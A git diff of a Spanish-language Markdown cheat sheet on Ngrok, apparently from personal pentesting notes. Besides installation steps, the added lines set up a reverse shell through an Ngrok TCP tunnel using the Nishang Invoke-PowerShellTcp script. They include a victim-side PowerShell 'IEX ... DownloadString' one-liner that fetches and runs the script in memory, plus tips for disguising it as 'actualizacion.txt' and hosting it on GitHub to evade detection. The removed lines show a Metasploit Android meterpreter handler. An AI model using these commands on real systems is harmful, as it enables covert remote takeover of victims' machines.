@@ -1,38 +1,49 @@
 # Ngrok
 
-Tags: #Ngrok
+Tags: #Ngrok #Windows #Powershell 
 
-* [Ngrok-Windows](https://download.ngrok.com/windows) es un servicio que nos permite crear nuestro servidor local en un subdominio para poder visualizarlo fuera de la LAN, a través de Internet.
+## Instalación
 
-## Instalación Kali
+* [Ngrok-Windows](https://download.ngrok.com/windows)
 
 ```bash 
-❯ wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz                                                
+# Para Linux 
 
-❯ tar xvzf ngrok-v3-stable-linux-amd64.tgz 
-ngrok
-
-❯ ./ngrok config add-authtoken PEGA_AQUI_TU_TOKEN
-Authtoken saved to configuration file: /root/.config/ngrok/ngrok.yml
+❯ wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz     # Descargas el binario                     
+❯ tar xvzf ngrok-v3-stable-linux-amd64.tgz           # Descomprimes el binario
+❯ ./ngrok config add-authtoken PEGA_AQUI_TU_TOKEN    # Agrega el Token de tu cuenta a Kali
 ```
 
 ## Comandos 
 
 ```bash 
 ❯ ngrok help                   # Panel de ayuda 
-❯ ngrok http 80                # Se pulica una web de local a publica
+❯ ngrok http 80                # Se publica una web de local a publica con un enlace que nos proporciona Ngrok
+```
+
+## Revershell Ngrok y Powershell
+
+* [Invoke-PowershellTCP](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+
+```bash 
+❯ ngrok tcp 443         # Exponemos publico el puerto 443 y Ngrok nos devolvera un 'tcp://2.tcp.ngrok.io:19215'. Utilizaremos la parte de '2.tcp.ngrok.io' en IPAddress y '19215' para el Port en el script de la revershell de abajo.  
+
+❯ rlwrap nc -nlvp 443   # Recibir la revershell en Kali
 ```
 
 ```bash 
-# Usar Ngrok para recibir una 'ReverShell' desde una app
+# Creamos un script con el contenido del enlace de arriba y al final le agregaremos este comando para poder usar Ngrok
 
-❯ ngrok tcp 4646               # Para abrir y recibir una conexion TCP (Te muestra el dominio publico y su puerto) que a su vez le esta haciendo un 'PortForwarding' a el puerto local '4646' de nuestra maquina
+❯ nvim Invoke-PowershellTCP.ps1
 
+	Invoke-PowerShellTcp -Reverse -IPAddress 2.tcp.ngrok.io -Port 19215 
 
-❯ msfconsole                   # Metasploit para recibir la conexion local en el puerto 4646
-	❯ use exploit/multi/handler
-	❯ set payload android/meterpreter/reverse_tcp 
-	❯ set LHOST 0.0.0.0
-	❯ set LPORT 4646
-	❯ exploit
+Nota: Este script lo podemos cargar a nuestro Github, ya que eso lo hara mas confiable al momento de llamarlo desde la maquina victima 
+Nota: Podemos colocarle un nombre discreto al script como 'actualizacion.txt'
+```
+
+```bash 
+# Desde la maquina victima con Windows llamamos al script que se encuentra almacenado en nuestro Github, esto lo hace a nivel de memoria por lo que es dificil de detectar y sirve como metodo de evasion
+
+❯ powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Omar/Scripts/main/Invoke-PowershellTCP.ps1')"
 ```
